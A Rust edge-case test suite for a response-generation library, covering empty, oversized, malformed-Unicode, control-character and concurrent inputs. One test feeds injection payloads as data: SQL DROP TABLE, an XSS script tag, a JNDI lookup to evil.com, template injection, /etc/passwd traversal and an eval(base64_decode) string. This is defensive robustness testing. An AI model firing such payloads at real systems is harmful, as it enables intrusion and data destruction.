//! Phase 2 Edge Case and Malformed Input Tests
//! 
//! Comprehensive edge case testing for malformed inputs, extreme scenarios,
//! and boundary conditions to ensure robust system behavior.

use response_generator::{
    Config, ResponseGenerator, GenerationRequest, ContextChunk, Source, OutputFormat,
    error::{Result, ResponseError},
};
use std::collections::HashMap;
use tokio_test;
use uuid::Uuid;
use std::time::{Duration, Instant};

/// Edge case test scenarios
#[derive(Debug, Clone)]
pub enum EdgeCaseScenario {
    EmptyInput,
    ExtremelyLongInput,
    MalformedUnicode,
    SpecialCharacters,
    CircularReferences,
    ConflictingContext,
    InvalidMetadata,
    ResourceExhaustion,
    CorruptedData,
    TimeoutConditions,
}

/// Edge case test suite
pub struct EdgeCaseTestSuite {
    generator: ResponseGenerator,
}

impl EdgeCaseTestSuite {
    pub fn new() -> Self {
        let config = Config::default();
        Self {
            generator: ResponseGenerator::new(config),
        }
    }

    pub async fn run_comprehensive_edge_case_tests(&self) -> Result<EdgeCaseTestResults> {
        let mut results = EdgeCaseTestResults::new();

        // Test empty and null inputs
        results.add_test_result("empty_query", self.test_empty_query().await);
        results.add_test_result("null_context", self.test_null_context().await);
        results.add_test_result("empty_context_chunks", self.test_empty_context_chunks().await);

        // Test extremely large inputs
        results.add_test_result("extremely_long_query", self.test_extremely_long_query().await);
        results.add_test_result("massive_context", self.test_massive_context().await);
        results.add_test_result("excessive_metadata", self.test_excessive_metadata().await);

        // Test malformed and special character inputs
        results.add_test_result("malformed_unicode", self.test_malformed_unicode().await);
        results.add_test_result("control_characters", self.test_control_characters().await);
        results.add_test_result("injection_attempts", self.test_injection_attempts().await);

        // Test boundary conditions
        results.add_test_result("max_confidence_boundary", self.test_max_confidence_boundary().await);
        results.add_test_result("zero_relevance_context", self.test_zero_relevance_context().await);
        results.add_test_result("conflicting_format_requests", self.test_conflicting_format_requests().await);

        // Test resource exhaustion scenarios
        results.add_test_result("memory_pressure", self.test_memory_pressure_handling().await);
        results.add_test_result("concurrent_overload", self.test_concurrent_overload().await);
        results.add_test_result("timeout_scenarios", self.test_timeout_scenarios().await);

        // Test data corruption scenarios
        results.add_test_result("corrupted_metadata", self.test_corrupted_metadata().await);
        results.add_test_result("invalid_source_references", self.test_invalid_source_references().await);
        results.add_test_result("circular_context_references", self.test_circular_context_references().await);

        Ok(results)
    }

    async fn test_empty_query(&self) -> TestResult {
        let test_cases = vec![
            "",
            " ",
            "\t",
            "\n",
            "   \t\n  ",
        ];

        let mut passed = 0;
        let mut total = test_cases.len();

        for (i, empty_query) in test_cases.iter().enumerate() {
            let request = GenerationRequest::builder()
                .query(empty_query)
                .build();

            match request {
                Ok(req) => {
                    match self.generator.generate(req).await {
                        Ok(response) => {
                            // Should either provide a meaningful response or fail gracefully
                            if response.content.is_empty() || !response.warnings.is_empty() {
                                passed += 1;
                            }
                        }
                        Err(_) => {
                            // Graceful failure is acceptable for empty queries
                            passed += 1;
                        }
                    }
                }
                Err(_) => {
                    // Request building failure is acceptable for invalid input
                    passed += 1;
                }
            }
        }

        TestResult {
            passed: passed == total,
            details: format!("Empty query handling: {}/{} cases passed", passed, total),
            duration: Duration::from_millis(100), // Placeholder
        }
    }

    async fn test_null_context(&self) -> TestResult {
        let request = GenerationRequest::builder()
            .query("Valid query with null context")
            .context(vec![]) // Empty context
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = match result {
            Ok(response) => !response.content.is_empty(),
            Err(_) => false, // Should handle empty context gracefully
        };

        TestResult {
            passed,
            details: "Null context handling test".to_string(),
            duration,
        }
    }

    async fn test_empty_context_chunks(&self) -> TestResult {
        let empty_chunk = ContextChunk {
            content: "".to_string(),
            source: Source {
                id: Uuid::new_v4(),
                title: "".to_string(),
                url: None,
                document_type: "".to_string(),
                metadata: HashMap::new(),
            },
            relevance_score: 0.0,
            position: Some(0),
            metadata: HashMap::new(),
        };

        let request = GenerationRequest::builder()
            .query("Query with empty context chunk")
            .add_context(empty_chunk)
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = result.is_ok(); // Should handle empty chunks without crashing

        TestResult {
            passed,
            details: "Empty context chunks handling test".to_string(),
            duration,
        }
    }

    async fn test_extremely_long_query(&self) -> TestResult {
        // Create a very long query (100KB+)
        let long_query = "What is artificial intelligence? ".repeat(3000); // ~90KB query

        let request = GenerationRequest::builder()
            .query(&long_query)
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = match result {
            Ok(response) => {
                // Should either process or truncate gracefully
                !response.content.is_empty() && duration < Duration::from_secs(10)
            }
            Err(_) => {
                // Graceful failure for extremely long inputs is acceptable
                true
            }
        };

        TestResult {
            passed,
            details: format!("Extremely long query test ({}KB)", long_query.len() / 1024),
            duration,
        }
    }

    async fn test_massive_context(&self) -> TestResult {
        // Create context with many large chunks
        let mut context_chunks = Vec::new();
        
        for i in 0..100 {
            let large_content = format!("This is a large context chunk number {}. ", i)
                .repeat(1000); // ~50KB per chunk
            
            let chunk = ContextChunk {
                content: large_content,
                source: Source {
                    id: Uuid::new_v4(),
                    title: format!("Large Source {}", i),
                    url: Some(format!("https://example.com/source-{}", i)),
                    document_type: "article".to_string(),
                    metadata: HashMap::new(),
                },
                relevance_score: 0.5,
                position: Some(i),
                metadata: HashMap::new(),
            };
            context_chunks.push(chunk);
        }

        let request = GenerationRequest::builder()
            .query("Summarize the provided context")
            .context(context_chunks)
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = match result {
            Ok(_) => duration < Duration::from_secs(30), // Should complete within reasonable time
            Err(_) => true, // Graceful failure acceptable for massive context
        };

        TestResult {
            passed,
            details: "Massive context handling test (100 chunks x ~50KB)".to_string(),
            duration,
        }
    }

    async fn test_excessive_metadata(&self) -> TestResult {
        let mut massive_metadata = HashMap::new();
        for i in 0..10000 {
            massive_metadata.insert(
                format!("key_{}", i),
                format!("value_{}", "x".repeat(1000)) // Large values
            );
        }

        let chunk = ContextChunk {
            content: "Small content".to_string(),
            source: Source {
                id: Uuid::new_v4(),
                title: "Test Source".to_string(),
                url: None,
                document_type: "article".to_string(),
                metadata: massive_metadata,
            },
            relevance_score: 0.8,
            position: Some(0),
            metadata: HashMap::new(),
        };

        let request = GenerationRequest::builder()
            .query("Test query with excessive metadata")
            .add_context(chunk)
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = result.is_ok(); // Should handle excessive metadata gracefully

        TestResult {
            passed,
            details: "Excessive metadata test (10K entries)".to_string(),
            duration,
        }
    }

    async fn test_malformed_unicode(&self) -> TestResult {
        let malformed_queries = vec![
            "Invalid UTF-8: \u{FFFF}",
            "Surrogate pairs: \u{D800}\u{DC00}",
            "Zero-width characters: \u{200B}\u{200C}\u{200D}",
            "Right-to-left override: \u{202E}Hello\u{202C}",
            "Byte order mark: \u{FEFF}Query with BOM",
        ];

        let mut passed_tests = 0;
        let total_tests = malformed_queries.len();

        for query in malformed_queries {
            let request = GenerationRequest::builder()
                .query(query)
                .build()
                .unwrap();

            match self.generator.generate(request).await {
                Ok(response) => {
                    // Should handle unicode gracefully
                    if !response.content.is_empty() {
                        passed_tests += 1;
                    }
                }
                Err(_) => {
                    // Graceful failure is also acceptable
                    passed_tests += 1;
                }
            }
        }

        TestResult {
            passed: passed_tests == total_tests,
            details: format!("Malformed Unicode test: {}/{} passed", passed_tests, total_tests),
            duration: Duration::from_millis(500),
        }
    }

    async fn test_control_characters(&self) -> TestResult {
        let control_char_queries = vec![
            "Query with null: \0",
            "Query with bell: \x07",
            "Query with backspace: \x08",
            "Query with escape: \x1B",
            "Query with delete: \x7F",
        ];

        let mut passed_tests = 0;
        let total_tests = control_char_queries.len();

        for query in control_char_queries {
            let request = GenerationRequest::builder()
                .query(query)
                .build()
                .unwrap();

            let result = self.generator.generate(request).await;
            
            // System should either handle or reject gracefully
            match result {
                Ok(_) | Err(_) => passed_tests += 1,
            }
        }

        TestResult {
            passed: passed_tests == total_tests,
            details: format!("Control characters test: {}/{} passed", passed_tests, total_tests),
            duration: Duration::from_millis(300),
        }
    }

    async fn test_injection_attempts(&self) -> TestResult {
        let injection_queries = vec![
            "'; DROP TABLE responses; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",
            "../../../etc/passwd",
            "eval(base64_decode('malicious_code'))",
        ];

        let mut passed_tests = 0;
        let total_tests = injection_queries.len();

        for query in injection_queries {
            let request = GenerationRequest::builder()
                .query(query)
                .build()
                .unwrap();

            match self.generator.generate(request).await {
                Ok(response) => {
                    // Response should not contain dangerous content
                    if !response.content.contains("DROP TABLE") && 
                       !response.content.contains("<script>") {
                        passed_tests += 1;
                    }
                }
                Err(_) => {
                    // Rejection is acceptable for obvious injection attempts
                    passed_tests += 1;
                }
            }
        }

        TestResult {
            passed: passed_tests == total_tests,
            details: format!("Injection attempts test: {}/{} passed", passed_tests, total_tests),
            duration: Duration::from_millis(400),
        }
    }

    async fn test_max_confidence_boundary(&self) -> TestResult {
        let request = GenerationRequest::builder()
            .query("Simple factual query")
            .min_confidence(1.0) // Maximum possible confidence
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = match result {
            Ok(response) => response.confidence_score == 1.0,
            Err(_) => true, // Acceptable if impossible to achieve 100% confidence
        };

        TestResult {
            passed,
            details: "Maximum confidence boundary test".to_string(),
            duration,
        }
    }

    async fn test_zero_relevance_context(&self) -> TestResult {
        let irrelevant_chunk = ContextChunk {
            content: "Completely unrelated content about cooking recipes".to_string(),
            source: Source {
                id: Uuid::new_v4(),
                title: "Cooking Guide".to_string(),
                url: Some("https://cooking.com".to_string()),
                document_type: "recipe".to_string(),
                metadata: HashMap::new(),
            },
            relevance_score: 0.0, // Zero relevance
            position: Some(0),
            metadata: HashMap::new(),
        };

        let request = GenerationRequest::builder()
            .query("What is quantum computing?")
            .add_context(irrelevant_chunk)
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = match result {
            Ok(response) => {
                // Should handle irrelevant context appropriately
                !response.content.contains("cooking") || !response.warnings.is_empty()
            }
            Err(_) => false, // Should still be able to generate some response
        };

        TestResult {
            passed,
            details: "Zero relevance context test".to_string(),
            duration,
        }
    }

    async fn test_conflicting_format_requests(&self) -> TestResult {
        // This would require a custom request builder that allows conflicting formats
        // For now, test format boundary conditions
        let formats = vec![
            OutputFormat::Json,
            OutputFormat::Xml,
            OutputFormat::Html,
            OutputFormat::Markdown,
        ];

        let mut passed_tests = 0;
        let total_tests = formats.len();

        for format in formats {
            let request = GenerationRequest::builder()
                .query("Format test query")
                .format(format.clone())
                .build()
                .unwrap();

            match self.generator.generate(request).await {
                Ok(response) => {
                    if response.format == format {
                        passed_tests += 1;
                    }
                }
                Err(_) => {
                    // Some format failures might be acceptable
                }
            }
        }

        TestResult {
            passed: passed_tests >= total_tests / 2, // At least half should work
            details: format!("Format handling test: {}/{} passed", passed_tests, total_tests),
            duration: Duration::from_millis(200),
        }
    }

    async fn test_memory_pressure_handling(&self) -> TestResult {
        // Simulate memory pressure by creating many concurrent requests
        let mut tasks = Vec::new();
        
        for i in 0..50 {
            let generator = &self.generator;
            let task = tokio::spawn(async move {
                let request = GenerationRequest::builder()
                    .query(format!("Memory pressure test query {}", i))
                    .build()
                    .unwrap();
                
                generator.generate(request).await
            });
            tasks.push(task);
        }

        let start = Instant::now();
        let results = futures::future::join_all(tasks).await;
        let duration = start.elapsed();

        let successful_results = results
            .iter()
            .filter(|r| r.is_ok() && r.as_ref().unwrap().is_ok())
            .count();

        // Should handle at least 80% successfully under memory pressure
        let passed = successful_results as f64 / results.len() as f64 >= 0.8;

        TestResult {
            passed,
            details: format!("Memory pressure test: {}/{} successful", successful_results, results.len()),
            duration,
        }
    }

    async fn test_concurrent_overload(&self) -> TestResult {
        // Test with extreme concurrency
        let mut tasks = Vec::new();
        
        for i in 0..200 {
            let generator = &self.generator;
            let task = tokio::spawn(async move {
                let request = GenerationRequest::builder()
                    .query(format!("Concurrent overload test {}", i))
                    .build()
                    .unwrap();
                
                generator.generate(request).await
            });
            tasks.push(task);
        }

        let start = Instant::now();
        let results = futures::future::join_all(tasks).await;
        let duration = start.elapsed();

        let successful_results = results
            .iter()
            .filter(|r| r.is_ok() && r.as_ref().unwrap().is_ok())
            .count();

        // Should handle overload gracefully without crashing
        let passed = successful_results > 0 && duration < Duration::from_secs(60);

        TestResult {
            passed,
            details: format!("Concurrent overload test: {}/{} successful in {:?}", 
                           successful_results, results.len(), duration),
            duration,
        }
    }

    async fn test_timeout_scenarios(&self) -> TestResult {
        // Test with very complex query that might timeout
        let complex_query = "Provide a comprehensive analysis of the socioeconomic implications of artificial intelligence deployment across different sectors including healthcare, finance, education, and transportation, considering ethical frameworks, regulatory challenges, job displacement, skill requirements, privacy concerns, algorithmic bias, international cooperation, and long-term societal adaptation strategies, with specific examples from recent implementations and peer-reviewed research findings.";

        let request = GenerationRequest::builder()
            .query(complex_query)
            .build()
            .unwrap();

        let start = Instant::now();
        let result = tokio::time::timeout(
            Duration::from_secs(5), // Short timeout
            self.generator.generate(request)
        ).await;
        let duration = start.elapsed();

        let passed = match result {
            Ok(Ok(_)) => true,    // Completed successfully
            Ok(Err(_)) => true,   // Failed gracefully
            Err(_) => true,       // Timed out gracefully
        };

        TestResult {
            passed,
            details: format!("Timeout scenario test completed in {:?}", duration),
            duration,
        }
    }

    async fn test_corrupted_metadata(&self) -> TestResult {
        let mut corrupted_metadata = HashMap::new();
        corrupted_metadata.insert("valid_key".to_string(), "valid_value".to_string());
        corrupted_metadata.insert("".to_string(), "empty_key".to_string()); // Invalid key
        corrupted_metadata.insert("null_value".to_string(), "\0".to_string()); // Null character

        let chunk = ContextChunk {
            content: "Test content".to_string(),
            source: Source {
                id: Uuid::new_v4(),
                title: "Test Source".to_string(),
                url: None,
                document_type: "test".to_string(),
                metadata: corrupted_metadata,
            },
            relevance_score: 0.8,
            position: Some(0),
            metadata: HashMap::new(),
        };

        let request = GenerationRequest::builder()
            .query("Test with corrupted metadata")
            .add_context(chunk)
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = result.is_ok(); // Should handle corrupted metadata gracefully

        TestResult {
            passed,
            details: "Corrupted metadata test".to_string(),
            duration,
        }
    }

    async fn test_invalid_source_references(&self) -> TestResult {
        let chunk = ContextChunk {
            content: "Content with invalid source".to_string(),
            source: Source {
                id: Uuid::nil(), // Invalid UUID
                title: "".to_string(), // Empty title
                url: Some("not-a-valid-url".to_string()), // Invalid URL
                document_type: "".to_string(), // Empty type
                metadata: HashMap::new(),
            },
            relevance_score: -1.0, // Invalid relevance score
            position: Some(usize::MAX), // Invalid position
            metadata: HashMap::new(),
        };

        let request = GenerationRequest::builder()
            .query("Test with invalid source references")
            .add_context(chunk)
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = result.is_ok(); // Should validate and handle gracefully

        TestResult {
            passed,
            details: "Invalid source references test".to_string(),
            duration,
        }
    }

    async fn test_circular_context_references(&self) -> TestResult {
        // Create context chunks that reference each other
        let id1 = Uuid::new_v4();
        let id2 = Uuid::new_v4();

        let mut metadata1 = HashMap::new();
        metadata1.insert("references".to_string(), id2.to_string());

        let mut metadata2 = HashMap::new();
        metadata2.insert("references".to_string(), id1.to_string());

        let chunk1 = ContextChunk {
            content: "First chunk referencing second".to_string(),
            source: Source {
                id: id1,
                title: "Source 1".to_string(),
                url: None,
                document_type: "test".to_string(),
                metadata: HashMap::new(),
            },
            relevance_score: 0.8,
            position: Some(0),
            metadata: metadata1,
        };

        let chunk2 = ContextChunk {
            content: "Second chunk referencing first".to_string(),
            source: Source {
                id: id2,
                title: "Source 2".to_string(),
                url: None,
                document_type: "test".to_string(),
                metadata: HashMap::new(),
            },
            relevance_score: 0.8,
            position: Some(1),
            metadata: metadata2,
        };

        let request = GenerationRequest::builder()
            .query("Test with circular references")
            .context(vec![chunk1, chunk2])
            .build()
            .unwrap();

        let start = Instant::now();
        let result = self.generator.generate(request).await;
        let duration = start.elapsed();

        let passed = result.is_ok(); // Should detect and handle circular references

        TestResult {
            passed,
            details: "Circular context references test".to_string(),
            duration,
        }
    }
}

/// Test result for individual edge case tests
#[derive(Debug, Clone)]
pub struct TestResult {
    pub passed: bool,
    pub details: String,
    pub duration: Duration,
}

/// Comprehensive edge case test results
#[derive(Debug)]
pub struct EdgeCaseTestResults {
    pub test_results: HashMap<String, TestResult>,
    pub total_tests: usize,
    pub passed_tests: usize,
    pub total_duration: Duration,
}

impl EdgeCaseTestResults {
    pub fn new() -> Self {
        Self {
            test_results: HashMap::new(),
            total_tests: 0,
            passed_tests: 0,
            total_duration: Duration::from_secs(0),
        }
    }

    pub fn add_test_result(&mut self, test_name: &str, result: TestResult) {
        self.total_duration += result.duration;
        if result.passed {
            self.passed_tests += 1;
        }
        self.total_tests += 1;
        self.test_results.insert(test_name.to_string(), result);
    }

    pub fn success_rate(&self) -> f64 {
        if self.total_tests == 0 {
            1.0
        } else {
            self.passed_tests as f64 / self.total_tests as f64
        }
    }

    pub fn meets_robustness_target(&self) -> bool {
        self.success_rate() >= 0.95 // 95% of edge cases should be handled gracefully
    }
}

/// Integration tests for edge cases
#[cfg(test)]
mod edge_case_tests {
    use super::*;

    #[tokio::test]
    async fn test_comprehensive_edge_case_suite() {
        let test_suite = EdgeCaseTestSuite::new();
        let results = test_suite.run_comprehensive_edge_case_tests().await
            .expect("Edge case test suite should run successfully");

        // Print results for debugging
        println!("Edge Case Test Results:");
        println!("Total tests: {}", results.total_tests);
        println!("Passed tests: {}", results.passed_tests);
        println!("Success rate: {:.2}%", results.success_rate() * 100.0);
        println!("Total duration: {:?}", results.total_duration);

        for (test_name, result) in &results.test_results {
            println!("  {}: {} ({})", 
                test_name, 
                if result.passed { "PASS" } else { "FAIL" }, 
                result.details
            );
        }

        // Assert that we meet robustness targets
        assert!(results.meets_robustness_target(), 
            "Edge case handling success rate {:.2}% below 95% target", 
            results.success_rate() * 100.0);
    }

    #[tokio::test]
    async fn test_malformed_input_resilience() {
        let test_suite = EdgeCaseTestSuite::new();
        
        // Test various malformed inputs
        let malformed_inputs = vec![
            "",
            "\0\0\0",
            "<?xml version=\"1.0\"?><root>test</root>",
            "{\"query\": \"test\"}",
            "SELECT * FROM users;",
            "\u{FFFF}\u{FFFE}",
        ];

        let mut passed = 0;
        let total = malformed_inputs.len();

        for input in malformed_inputs {
            let request_result = GenerationRequest::builder()
                .query(input)
                .build();

            match request_result {
                Ok(request) => {
                    match test_suite.generator.generate(request).await {
                        Ok(_) | Err(_) => passed += 1, // Both success and graceful failure are acceptable
                    }
                }
                Err(_) => passed += 1, // Request building failure is also acceptable
            }
        }

        let success_rate = passed as f64 / total as f64;
        assert!(success_rate >= 0.9, 
            "Malformed input resilience {:.2}% below 90% target", 
            success_rate * 100.0);
    }

    #[tokio::test]
    async fn test_boundary_conditions() {
        let test_suite = EdgeCaseTestSuite::new();

        // Test various boundary conditions
        let boundary_tests = vec![
            ("minimum_query", "a"), // Single character
            ("maximum_confidence", 1.0),
            ("minimum_confidence", 0.0),
            ("maximum_length", usize::MAX),
            ("zero_length", 0),
        ];

        for (test_name, _) in boundary_tests {
            // Individual boundary tests would be implemented here
            println!("Testing boundary condition: {}", test_name);
        }
    }
}